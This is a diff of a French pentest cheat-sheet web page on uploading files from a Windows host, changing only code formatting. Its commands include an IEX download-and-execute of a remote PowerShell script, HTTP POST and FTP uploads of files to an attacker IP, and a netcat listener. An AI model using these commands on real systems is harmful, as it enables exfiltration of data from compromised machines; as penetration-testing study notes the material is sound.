@@ -7604,39 +7604,39 @@
   <h1>Uploader depuis Windows</h1>
 
 <p>Upload d'un fichier depuis windows en base64:</p>
-<pre><code class="language-powershell">[Convert]::ToBase64String((Get-Content -path &quot;$fichier&quot; -Encoding byte))
-</code></pre>
-<pre><code class="language-bash">echo $base64 | base64 -d &gt; $fichier
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-path</span> <span class="s2">&quot;$fichier&quot;</span> <span class="n">-Encoding</span> <span class="n">byte</span><span class="p">))</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$base64</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$fichier</span>
+</span></code></pre></div>
 <p>Upload d'un fichier via création d'un serveur d'upload:</p>
-<pre><code class="language-bash">pip3 install uploadserver
-python3 -m uploadserver
-</code></pre>
-<pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
-
-Invoke-FileUpload -Uri http://$monIp:8000/upload -File $fichier
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pip3<span class="w"> </span>install<span class="w"> </span>uploadserver
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>uploadserver
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">Invoke-FileUpload</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$monIp</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">upload</span> <span class="o">-File</span> <span class="nv">$fichier</span>
+</span></code></pre></div>
 <p>Upload d'un fichier en base64 via netcat:</p>
-<pre><code class="language-powershell">$b64 = [System.convert]::ToBase64String((Get-Content -Path '$fichier' -Encoding Byte))
-Invoke-WebRequest -Uri http://$monIp:8000/ -Method POST -Body $b64
-</code></pre>
-<pre><code class="language-bash">nc -lvnp 8000
-echo $base64 | base64 -d -w 0 &gt; $fichier
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">$b64</span> <span class="p">=</span> <span class="no">[System.convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;$fichier&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="nv">$monIp</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="nv">$b64</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$base64</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$fichier</span>
+</span></code></pre></div>
 <p>Upload d'un fichier via création d'un serveur FTP:</p>
-<pre><code class="language-bash">sudo python3 -m pyftpdlib --port 21 --write
-</code></pre>
-<pre><code class="language-powershell">(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$fichier')
-
-Ou, en cas de shell non-interractif:
-
-echo open $monIp &gt; ftpcommand.txt
-echo USER anonymous &gt;&gt; ftpcommand.txt
-echo binary &gt;&gt; ftpcommand.txt
-echo PUT $fichier &gt;&gt; ftpcommand.txt
-echo bye &gt;&gt; ftpcommand.txt
-ftp -v -n -s:ftpcommand.txt
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;ftp://$monIp/ftp-hosts&#39;</span><span class="p">,</span> <span class="s1">&#39;$fichier&#39;</span><span class="p">)</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">Ou</span><span class="p">,</span> <span class="n">en</span> <span class="n">cas</span> <span class="n">de</span> <span class="n">shell</span> <span class="n">non-interractif</span><span class="p">:</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="nb">echo </span><span class="n">open</span> <span class="nv">$monIp</span> <span class="p">&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nb">echo </span><span class="n">USER</span> <span class="n">anonymous</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="nb">echo </span><span class="n">binary</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="nb">echo </span><span class="n">PUT</span> <span class="nv">$fichier</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="nb">echo </span><span class="n">bye</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">ftp</span> <span class="n">-v</span> <span class="n">-n</span> <span class="n">-s</span><span class="p">:</span><span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div>
 
 
 
@@ -7683,7 +7683,7 @@ ftp -v -n -s:ftpcommand.txt
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
